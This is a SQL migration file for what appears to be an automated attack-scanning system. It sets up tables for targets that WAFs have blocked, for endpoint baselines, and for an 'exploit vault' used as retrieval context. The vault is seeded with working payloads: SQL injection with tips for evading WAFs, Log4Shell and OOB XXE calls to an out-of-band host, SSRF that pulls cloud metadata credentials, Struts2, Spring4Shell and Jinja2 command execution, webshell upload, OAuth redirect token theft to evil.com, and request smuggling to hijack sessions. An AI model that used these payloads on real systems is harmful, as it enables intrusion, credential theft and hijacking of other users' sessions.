
-- T2 #6: WAF kill-switch tracker
CREATE TABLE IF NOT EXISTS public.dead_targets (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  target_id UUID,
  host TEXT NOT NULL,
  reason TEXT NOT NULL DEFAULT 'status_zero_streak',
  zero_streak INTEGER NOT NULL DEFAULT 0,
  banned_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  expires_at TIMESTAMPTZ NOT NULL DEFAULT (now() + interval '6 hours'),
  meta JSONB NOT NULL DEFAULT '{}'::jsonb,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
CREATE UNIQUE INDEX IF NOT EXISTS dead_targets_host_uq ON public.dead_targets(host);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.dead_targets TO authenticated;
GRANT ALL ON public.dead_targets TO service_role;
ALTER TABLE public.dead_targets ENABLE ROW LEVEL SECURITY;
CREATE POLICY "dead_targets admin all" ON public.dead_targets FOR ALL TO authenticated
  USING (public.has_role(auth.uid(), 'admin')) WITH CHECK (public.has_role(auth.uid(), 'admin'));

-- T1 #2: 404 ghost-town baseline cache
CREATE TABLE IF NOT EXISTS public.endpoint_baselines (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  url TEXT NOT NULL,
  status INTEGER NOT NULL,
  body_len INTEGER NOT NULL DEFAULT 0,
  content_type TEXT,
  tech JSONB NOT NULL DEFAULT '{}'::jsonb,
  checked_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
CREATE UNIQUE INDEX IF NOT EXISTS endpoint_baselines_url_uq ON public.endpoint_baselines(url);
CREATE INDEX IF NOT EXISTS endpoint_baselines_checked_idx ON public.endpoint_baselines(checked_at);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.endpoint_baselines TO authenticated;
GRANT ALL ON public.endpoint_baselines TO service_role;
ALTER TABLE public.endpoint_baselines ENABLE ROW LEVEL SECURITY;
CREATE POLICY "endpoint_baselines admin all" ON public.endpoint_baselines FOR ALL TO authenticated
  USING (public.has_role(auth.uid(), 'admin')) WITH CHECK (public.has_role(auth.uid(), 'admin'));

-- T3 #11: RAG exploit vault (keyword + optional semantic search)
CREATE TABLE IF NOT EXISTS public.rag_exploits (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  source TEXT NOT NULL,           -- 'hackerone' | 'cve' | 'manual' | ...
  source_ref TEXT,                -- H1 report id, CVE id, URL
  vuln_class TEXT NOT NULL,       -- 'sqli','xss','ssrf','rce','idor','xxe','ssti','lfi','redirect',...
  tech_tags TEXT[] NOT NULL DEFAULT '{}',  -- ['nextjs','iis','wordpress',...]
  title TEXT NOT NULL,
  summary TEXT NOT NULL,          -- root cause + payload pattern, <2KB
  exploit_pattern TEXT,           -- canonical payload skeleton
  severity TEXT,
  confidence INTEGER NOT NULL DEFAULT 80,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
CREATE INDEX IF NOT EXISTS rag_exploits_class_idx ON public.rag_exploits(vuln_class);
CREATE INDEX IF NOT EXISTS rag_exploits_tech_idx ON public.rag_exploits USING GIN (tech_tags);
GRANT SELECT ON public.rag_exploits TO authenticated;
GRANT ALL ON public.rag_exploits TO service_role;
ALTER TABLE public.rag_exploits ENABLE ROW LEVEL SECURITY;
CREATE POLICY "rag_exploits read auth" ON public.rag_exploits FOR SELECT TO authenticated USING (true);
CREATE POLICY "rag_exploits admin write" ON public.rag_exploits FOR INSERT TO authenticated
  WITH CHECK (public.has_role(auth.uid(), 'admin'));
CREATE POLICY "rag_exploits admin update" ON public.rag_exploits FOR UPDATE TO authenticated
  USING (public.has_role(auth.uid(), 'admin')) WITH CHECK (public.has_role(auth.uid(), 'admin'));
CREATE POLICY "rag_exploits admin delete" ON public.rag_exploits FOR DELETE TO authenticated
  USING (public.has_role(auth.uid(), 'admin'));

-- Seed a small offensive-knowledge corpus so RAG returns useful context on day one.
INSERT INTO public.rag_exploits (source, source_ref, vuln_class, tech_tags, title, summary, exploit_pattern, severity, confidence) VALUES
('hackerone','generic','sqli','{mssql,iis,aspnet}','Boolean MSSQL SQLi via numeric param',
 'Numeric IDs on .aspx endpoints often unquoted. Pivot from `?id=1` to `?id=1 AND 1=1--` then `?id=1 AND 1=2--`. Detect by length delta + System.Data.SqlClient error. Then escalate to UNION SELECT db_name(),@@version-- .',
 '?id=1 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.databases))--','high',90),
('hackerone','generic','sqli','{mysql,php,wordpress}','Time-based blind SQLi WordPress plugins',
 'Most WP plugin SQLi sits in unauthenticated AJAX actions. Use `SLEEP(5)` ONLY as last resort; prefer `BENCHMARK(5000000,MD5(1))` to evade WAFs that strip sleep. Confirm with second-order: write into options table only as ADMIN-confirmed safe POC.',
 'admin-ajax.php?action=PLUGIN_ACTION&id=1)) OR (SELECT BENCHMARK(5000000,MD5(1)))--','critical',92),
('cve','CVE-2021-44228','rce','{log4j,java}','log4shell JNDI injection',
 'Any user-controlled string logged by log4j 2.x <2.15 triggers JNDI lookup. Inject `${jndi:ldap://OOB_HOST/x}` into User-Agent, Referer, X-Forwarded-For, search params, auth headers. Proof = OOB DNS hit.',
 '${jndi:ldap://OOB_HOST/x}','critical',99),
('hackerone','generic','ssrf','{aws,gcp,nodejs,php}','Cloud metadata SSRF',
 'Server-side fetchers that accept user URLs → request `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS) or `http://metadata.google.internal/computeMetadata/v1/?recursive=true` with `Metadata-Flavor: Google`. Bypass blocklists with `http://[::ffff:a9fe:a9fe]/`, `http://2852039166/`, or DNS rebinding domain (`spoofed.burpcollaborator.net`).',
 'http://169.254.169.254/latest/meta-data/iam/security-credentials/','critical',95),
('hackerone','generic','xss','{react,nextjs}','dangerouslySetInnerHTML reflected XSS',
 'React escapes by default EXCEPT `dangerouslySetInnerHTML`. Hunt for params reflected into innerHTML in client bundles. Payload uses event handlers, not <script>: `<img src=x onerror=alert(1)>` or `<svg onload=alert(1)>`. SSR (getServerSideProps) reflections appear before hydration.',
 '<svg/onload=alert(document.domain)>','high',88),
('cve','CVE-2017-5638','rce','{struts2,java}','Apache Struts2 OGNL via Content-Type',
 'OGNL expression in malformed Content-Type header executes server-side. Set `Content-Type: %{(#_=''multipart/form-data'').(#cmd=''id'').(#p=new java.lang.ProcessBuilder(#cmd)).(#p.start())}`.',
 'Content-Type: %{(#cmd=''id'').(#p=new java.lang.ProcessBuilder(#cmd)).(#p.start())}','critical',97),
('hackerone','generic','idor','{rest,graphql,nodejs}','Authorisation-by-obscurity IDOR',
 'After logging in as user A, replay request swapping `userId`/`orderId`/UUID with user B''s. Try sequential ints, predictable UUIDv1 (timestamp-based), or `me` → `1`. GraphQL: try aliasing the same query under multiple ids in one batch.',
 'PATCH /api/users/{victim_id} with own JWT','high',90),
('cve','CVE-2022-22965','rce','{spring,java}','Spring4Shell class loader RCE',
 'Form-binding attack against Spring MVC. POST `class.module.classLoader.resources.context.parent.pipeline.first.pattern=...%{c2}i` to drop a JSP webshell. Requires JDK 9+ and WAR deployment on Tomcat.',
 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=','critical',94),
('hackerone','generic','xxe','{xml,soap,java,dotnet}','Out-of-band XXE',
 'When XML parser has external entities enabled, inject `<!DOCTYPE x [<!ENTITY % a SYSTEM "http://OOB_HOST/x.dtd">%a;]>`. Use OOB DTD to exfiltrate /etc/passwd or C:\Windows\win.ini through nested entity.',
 '<!DOCTYPE x [<!ENTITY % e SYSTEM "http://OOB_HOST/x.dtd">%e;]>','high',93),
('hackerone','generic','ssti','{jinja2,flask,python}','Jinja2 SSTI to RCE',
 'When user input lands in `render_template_string`, escape with `{{7*7}}` then escalate to `{{config}}` then `{{ ''''.__class__.__mro__[1].__subclasses__() }}` and pick `Popen` to spawn shell.',
 '{{ self.__init__.__globals__.__builtins__.__import__(''os'').popen(''id'').read() }}','critical',95),
('cve','CVE-2023-38831','rce','{winrar,windows}','WinRAR ANSI extension trick','Not web — skip','','medium',40),
('hackerone','generic','open-redirect','{oauth,sso}','OAuth redirect_uri bypass',
 'Bypass redirect_uri allowlists with `@evil.com`, `evil.com#legit.com`, `legit.com.evil.com`, or `//evil.com`. Steal tokens by appending fragment to relative path: `/oauth/callback//evil.com`.',
 '/oauth/callback//attacker.tld','medium',85),
('hackerone','generic','rce','{wordpress,php}','WP unauthenticated file upload to RCE',
 'Many WP plugins expose AJAX upload without nonce. Upload `shell.phtml` with `Content-Type: image/jpeg` and magic bytes `\xFF\xD8\xFF`. Path: `/wp-content/uploads/YYYY/MM/shell.phtml?cmd=id`.',
 'POST admin-ajax.php?action=plupload\nContent-Disposition: form-data; name="async-upload"; filename="shell.phtml"','critical',93),
('hackerone','generic','smuggling','{nginx,haproxy,cloudfront}','HTTP Request Smuggling CL.TE',
 'Front-end uses Content-Length, back-end uses Transfer-Encoding. Smuggle a second request whose method is poisoned to hijack the NEXT user''s session.',
 'Transfer-Encoding: chunked\\nContent-Length: 4\\n\\n0\\n\\nGSMUGGLED /admin HTTP/1.1','critical',91),
('hackerone','generic','prototype-pollution','{nodejs,express}','Prototype pollution → RCE on Express',
 'Merging user JSON into Object.prototype via vulnerable `merge`/`extend`/`set`. After pollution, set gadget like `__proto__.shell` so child_process picks it up. Confirm with `{"__proto__":{"polluted":1}}`.',
 '{"__proto__":{"toString":"polluted"}}','high',86)
ON CONFLICT DO NOTHING;
